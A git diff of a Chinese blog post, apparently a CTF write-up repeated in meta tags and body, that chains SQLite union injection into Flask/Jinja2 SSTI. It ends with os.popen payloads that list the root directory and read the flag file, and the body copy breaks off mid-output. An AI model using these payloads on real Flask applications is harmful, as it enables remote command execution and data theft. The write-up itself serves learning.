@@ -14,38 +14,112 @@
 首先看题面的内容：sqlmap可能一把锁出来，但是sqlmap一把锁出来不太可能，首先猜测是sql注入漏洞，先进行一般的测试：
 进行常见的sql测试：1 or 1=1 --+ 检测回显，1 order by 1=1 --+ 测试列数，发现只有一列？随即进行1 union select database() --+
 进行爆库，发现报错，没有道理报错，意识到这可能不是mysql，可能是其余的数据库，后续的hint也证明了这一观点，并且由于部分内容的相似性，猜测是sqlite，后续hint内容也证明了这一个观点，那么，进行sqlite注入：
-爆库：1 union select sql from sqlite_master; --+
+爆库：
+```
+1 union select sql from sqlite_master; --+
+```
 回显CREATE TABLE messages ( id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT NOT NULL )
 接下来爆内容
+```
 1 union select group_concat(id) from messages; --+
+```
+```
 1 union select group_concat(content) from messages; --+
+```
 结果发现毛也没有，这下炸缸了………………
 比赛的时候就打到这里就没了，因为ssti没有学好，现在，进行下一步
 由hint和内容，开使尝试ssti注入：
+```
 1 union select '{{7*2}}' --+
+```
 发现回显14
 哦吼，有说法了
 开始倒序排模版类
+```
 1 union select '{{config}}' --+
+```
+进行爆配置：
+回显：
+查询结果如下: <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
+
+接下来例行爆可用库：
+```
+1 union select '{{config.__class__.__init__.__globals__}}' --+
+```
+回显:
+
+: {'__name__': 'flask.config', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f0cfa209760>, '__spec__': ModuleSpec(name='flask.config', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f0cfa209760>, origin='/usr/local/lib/python3.8/site-packages/flask/config.py'), '__file__': '/usr/local/lib/python3.8/site-packages/flask/config.py', '__cached__': '/usr/local/lib/python3.8/site-packages/flask/__pycache__/config.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': 'Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.', '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'annotations': _Feature((3, 7, 0, 'beta', 1), (3, 10, 0, 'alpha', 0), 16777216), 'errno': <module 'errno' (built-in)>, 'json': <module 'json' from '/usr/local/lib/python3.8/json/__init__.py'>, 'os': <module 'os' from '/usr/local/lib/python3.8/os.py'>, 'types': <module 'types' from '/usr/local/lib/python3.8/types.py'>, 't': <module 'typing' from '/usr/local/lib/python3.8/typing.py'>, 'import_string': <function import_string at 0x7f0cfaeaa310>, 'T': ~T, 'ConfigAttribute': <class 'flask.config.ConfigAttribute'>, 'Config': <class 'flask.config.Config'>}
+
+搜索发现敏感库os未禁用
+那么掏出调用os库的注入payload看看有没有过滤：
+```
+1 union select '{{config.__class__.__init__.__globals__.os.popen('ls /').read()}}' --+
+```
+发现无waf
+回显：
+app bin boot dev docker-entrypoint.sh etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 
+发现flag
+那么
+```
+1 union select '{{config.__class__.__init__.__globals__.os.popen('cat /flag').read()}}' --+
+```
+拿下flag：ZJNUCTF{SSTI_SQL_GOD!!!!bdc85e3e675e} 
 ~~前面的路以后再来探索吧(留档提醒自己更新)~~。">
 <meta property="og:title" content="校赛复盘">
 <meta property="og:description" content="## 3、留言框（尖尖的）复现
 首先看题面的内容：sqlmap可能一把锁出来，但是sqlmap一把锁出来不太可能，首先猜测是sql注入漏洞，先进行一般的测试：
 进行常见的sql测试：1 or 1=1 --+ 检测回显，1 order by 1=1 --+ 测试列数，发现只有一列？随即进行1 union select database() --+
 进行爆库，发现报错，没有道理报错，意识到这可能不是mysql，可能是其余的数据库，后续的hint也证明了这一观点，并且由于部分内容的相似性，猜测是sqlite，后续hint内容也证明了这一个观点，那么，进行sqlite注入：
-爆库：1 union select sql from sqlite_master; --+
+爆库：
+```
+1 union select sql from sqlite_master; --+
+```
 回显CREATE TABLE messages ( id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT NOT NULL )
 接下来爆内容
+```
 1 union select group_concat(id) from messages; --+
+```
+```
 1 union select group_concat(content) from messages; --+
+```
 结果发现毛也没有，这下炸缸了………………
 比赛的时候就打到这里就没了，因为ssti没有学好，现在，进行下一步
 由hint和内容，开使尝试ssti注入：
+```
 1 union select '{{7*2}}' --+
+```
 发现回显14
 哦吼，有说法了
 开始倒序排模版类
+```
 1 union select '{{config}}' --+
+```
+进行爆配置：
+回显：
+查询结果如下: <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
+
+接下来例行爆可用库：
+```
+1 union select '{{config.__class__.__init__.__globals__}}' --+
+```
+回显:
+
+: {'__name__': 'flask.config', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f0cfa209760>, '__spec__': ModuleSpec(name='flask.config', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f0cfa209760>, origin='/usr/local/lib/python3.8/site-packages/flask/config.py'), '__file__': '/usr/local/lib/python3.8/site-packages/flask/config.py', '__cached__': '/usr/local/lib/python3.8/site-packages/flask/__pycache__/config.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': 'Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.', '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'annotations': _Feature((3, 7, 0, 'beta', 1), (3, 10, 0, 'alpha', 0), 16777216), 'errno': <module 'errno' (built-in)>, 'json': <module 'json' from '/usr/local/lib/python3.8/json/__init__.py'>, 'os': <module 'os' from '/usr/local/lib/python3.8/os.py'>, 'types': <module 'types' from '/usr/local/lib/python3.8/types.py'>, 't': <module 'typing' from '/usr/local/lib/python3.8/typing.py'>, 'import_string': <function import_string at 0x7f0cfaeaa310>, 'T': ~T, 'ConfigAttribute': <class 'flask.config.ConfigAttribute'>, 'Config': <class 'flask.config.Config'>}
+
+搜索发现敏感库os未禁用
+那么掏出调用os库的注入payload看看有没有过滤：
+```
+1 union select '{{config.__class__.__init__.__globals__.os.popen('ls /').read()}}' --+
+```
+发现无waf
+回显：
+app bin boot dev docker-entrypoint.sh etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 
+发现flag
+那么
+```
+1 union select '{{config.__class__.__init__.__globals__.os.popen('cat /flag').read()}}' --+
+```
+拿下flag：ZJNUCTF{SSTI_SQL_GOD!!!!bdc85e3e675e} 
 ~~前面的路以后再来探索吧(留档提醒自己更新)~~。">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://C137-backer.github.io/post/xiao-sai-fu-pan.html">
@@ -75,7 +149,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -111,19 +195,45 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <p>首先看题面的内容：sqlmap可能一把锁出来，但是sqlmap一把锁出来不太可能，首先猜测是sql注入漏洞，先进行一般的测试：<br>
 进行常见的sql测试：1 or 1=1 --+ 检测回显，1 order by 1=1 --+ 测试列数，发现只有一列？随即进行1 union select database() --+<br>
 进行爆库，发现报错，没有道理报错，意识到这可能不是mysql，可能是其余的数据库，后续的hint也证明了这一观点，并且由于部分内容的相似性，猜测是sqlite，后续hint内容也证明了这一个观点，那么，进行sqlite注入：<br>
-爆库：1 union select sql from sqlite_master; --+<br>
-回显CREATE TABLE messages ( id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT NOT NULL )<br>
-接下来爆内容<br>
-1 union select group_concat(id) from messages; --+<br>
-1 union select group_concat(content) from messages; --+<br>
-结果发现毛也没有，这下炸缸了………………<br>
+爆库：</p>
+<pre class="notranslate"><code class="notranslate">1 union select sql from sqlite_master; --+
+</code></pre>
+<p>回显CREATE TABLE messages ( id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT NOT NULL )<br>
+接下来爆内容</p>
+<pre class="notranslate"><code class="notranslate">1 union select group_concat(id) from messages; --+
+</code></pre>
+<pre class="notranslate"><code class="notranslate">1 union select group_concat(content) from messages; --+
+</code></pre>
+<p>结果发现毛也没有，这下炸缸了………………<br>
 比赛的时候就打到这里就没了，因为ssti没有学好，现在，进行下一步<br>
-由hint和内容，开使尝试ssti注入：<br>
-1 union select '{{7*2}}' --+<br>
-发现回显14<br>
+由hint和内容，开使尝试ssti注入：</p>
+<pre class="notranslate"><code class="notranslate">1 union select '{{7*2}}' --+
+</code></pre>
+<p>发现回显14<br>
 哦吼，有说法了<br>
-开始倒序排模版类<br>
-1 union select '{{config}}' --+<br>
+开始倒序排模版类</p>
+<pre class="notranslate"><code class="notranslate">1 union select '{{config}}' --+
+</code></pre>
+<p>进行爆配置：<br>
+回显：<br>
+查询结果如下: &lt;Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}&gt;</p>
+<p>接下来例行爆可用库：</p>
+<pre class="notranslate"><code class="notranslate">1 union select '{{config.__class__.__init__.__globals__}}' --+
+</code></pre>
+<p>回显:</p>
+<p>: {'<strong>name</strong>': 'flask.config', '<strong>doc</strong>': None, '<strong>package</strong>': 'flask', '<strong>loader</strong>': &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f0cfa209760&gt;, '<strong>spec</strong>': ModuleSpec(name='flask.config', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x7f0cfa209760&gt;, origin='/usr/local/lib/python3.8/site-packages/flask/config.py'), '<strong>file</strong>': '/usr/local/lib/python3.8/site-packages/flask/config.py', '<strong>cached</strong>': '/usr/local/lib/python3.8/site-packages/flask/<strong>pycache</strong>/config.cpython-38.pyc', '<strong>builtins</strong>': {'<strong>name</strong>': 'builtins', '<strong>doc</strong>': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the <code class="notranslate">nil' object; Ellipsis represents </code>...' in slices.", '<strong>package</strong>': '', '<strong>loader</strong>': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '<strong>spec</strong>': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;), '<strong>build_class</strong>': , '<strong>import</strong>': , 'abs': , 'all': , 'any': , 'ascii': , 'bin': , 'breakpoint': , 'callable': , 'chr': , 'compile': , 'delattr': , 'dir': , 'divmod': , 'eval': , 'exec': , 'format': , 'getattr': , 'globals': , 'hasattr': , 'hash': , 'hex': , 'id': , 'input': , 'isinstance': , 'issubclass': , 'iter': , 'len': , 'locals': , 'max': , 'min': , 'next': , 'oct': , 'ord': , 'pow': , 'print': , 'repr': , 'round': , 'setattr': , 'sorted': , 'sum': , 'vars': , 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': &lt;class 'bool'&gt;, 'memoryview': &lt;class 'memoryview'&gt;, 'bytearray': &lt;class 'bytearray'&gt;, 'bytes': &lt;class 'bytes'&gt;, 'classmethod': &lt;class 'classmethod'&gt;, 'complex': &lt;class 'complex'&gt;, 'dict': &lt;class 'dict'&gt;, 'enumerate': &lt;class 'enumerate'&gt;, 'filter': &lt;class 'filter'&gt;, 'float': &lt;class 'float'&gt;, 'frozenset': &lt;class 'frozenset'&gt;, 'property': &lt;class 'property'&gt;, 'int': &lt;class 'int'&gt;, 'list': &lt;class 'list'&gt;, 'map': &lt;class 'map'&gt;, 'object': &lt;class 'object'&gt;, 'range': &lt;class 'range'&gt;, 'reversed': &lt;class 'reversed'&gt;, 'set': &lt;class 'set'&gt;, 'slice': &lt;class 'slice'&gt;, 'staticmethod': &lt;class 'staticmethod'&gt;, 'str': &lt;class 'str'&gt;, 'super': &lt;class 'super'&gt;, 'tuple': &lt;class 'tuple'&gt;, 'type': &lt;class 'type'&gt;, 'zip': &lt;class 'zip'&gt;, '<strong>debug</strong>': True, 'BaseException': &lt;class 'BaseException'&gt;, 'Exception': &lt;class 'Exception'&gt;, 'TypeError': &lt;class 'TypeError'&gt;, 'StopAsyncIteration': &lt;class 'StopAsyncIteration'&gt;, 'StopIteration': &lt;class 'StopIteration'&gt;, 'GeneratorExit': &lt;class 'GeneratorExit'&gt;, 'SystemExit': &lt;class 'SystemExit'&gt;, 'KeyboardInterrupt': &lt;class 'KeyboardInterrupt'&gt;, 'ImportError': &lt;class 'ImportError'&gt;, 'ModuleNotFoundError': &lt;class 'ModuleNotFoundError'&gt;, 'OSError': &lt;class 'OSError'&gt;, 'EnvironmentError': &lt;class 'OSError'&gt;, 'IOError': &lt;class 'OSError'&gt;, 'EOFError': &lt;class 'EOFError'&gt;, 'RuntimeError': &lt;class 'RuntimeError'&gt;, 'RecursionError': &lt;class 'RecursionError'&gt;, 'NotImplementedError': &lt;class 'NotImplementedError'&gt;, 'NameError': &lt;class 'NameError'&gt;, 'UnboundLocalError': &lt;class 'UnboundLocalError'&gt;, 'AttributeError': &lt;class 'AttributeError'&gt;, 'SyntaxError': &lt;class 'SyntaxError'&gt;, 'IndentationError': &lt;class 'IndentationError'&gt;, 'TabError': &lt;class 'TabError'&gt;, 'LookupError': &lt;class 'LookupError'&gt;, 'IndexError': &lt;class 'IndexError'&gt;, 'KeyError': &lt;class 'KeyError'&gt;, 'ValueError': &lt;class 'ValueError'&gt;, 'UnicodeError': &lt;class 'UnicodeError'&gt;, 'UnicodeEncodeError': &lt;class 'UnicodeEncodeError'&gt;, 'UnicodeDecodeError': &lt;class 'UnicodeDecodeError'&gt;, 'UnicodeTranslateError': &lt;class 'UnicodeTranslateError'&gt;, 'AssertionError': &lt;class 'AssertionError'&gt;, 'ArithmeticError': &lt;class 'ArithmeticError'&gt;, 'FloatingPointError': &lt;class 'FloatingPointError'&gt;, 'OverflowError': &lt;class 'OverflowError'&gt;, 'ZeroDivisionError': &lt;class 'ZeroDivisionError'&gt;, 'SystemError': &lt;class 'SystemError'&gt;, 'ReferenceError': &lt;class 'ReferenceError'&gt;, 'MemoryError': &lt;class 'MemoryError'&gt;, 'BufferError': &lt;class 'BufferError'&gt;, 'Warning': &lt;class 'Warning'&gt;, 'UserWarning': &lt;class 'UserWarning'&gt;, 'DeprecationWarning': &lt;class 'DeprecationWarning'&gt;, 'PendingDeprecationWarning': &lt;class 'PendingDeprecationWarning'&gt;, 'SyntaxWarning': &lt;class 'SyntaxWarning'&gt;, 'RuntimeWarning': &lt;class 'RuntimeWarning'&gt;, 'FutureWarning': &lt;class 'FutureWarning'&gt;, 'ImportWarning': &lt;class 'ImportWarning'&gt;, 'UnicodeWarning': &lt;class 'UnicodeWarning'&gt;, 'BytesWarning': &lt;class 'BytesWarning'&gt;, 'ResourceWarning': &lt;class 'ResourceWarning'&gt;, 'ConnectionError': &lt;class 'ConnectionError'&gt;, 'BlockingIOError': &lt;class 'BlockingIOError'&gt;, 'BrokenPipeError': &lt;class 'BrokenPipeError'&gt;, 'ChildProcessError': &lt;class 'ChildProcessError'&gt;, 'ConnectionAbortedError': &lt;class 'ConnectionAbortedError'&gt;, 'ConnectionRefusedError': &lt;class 'ConnectionRefusedError'&gt;, 'ConnectionResetError': &lt;class 'ConnectionResetError'&gt;, 'FileExistsError': &lt;class 'FileExistsError'&gt;, 'FileNotFoundError': &lt;class 'FileNotFoundError'&gt;, 'IsADirectoryError': &lt;class 'IsADirectoryError'&gt;, 'NotADirectoryError': &lt;class 'NotADirectoryError'&gt;, 'InterruptedError': &lt;class 'InterruptedError'&gt;, 'PermissionError': 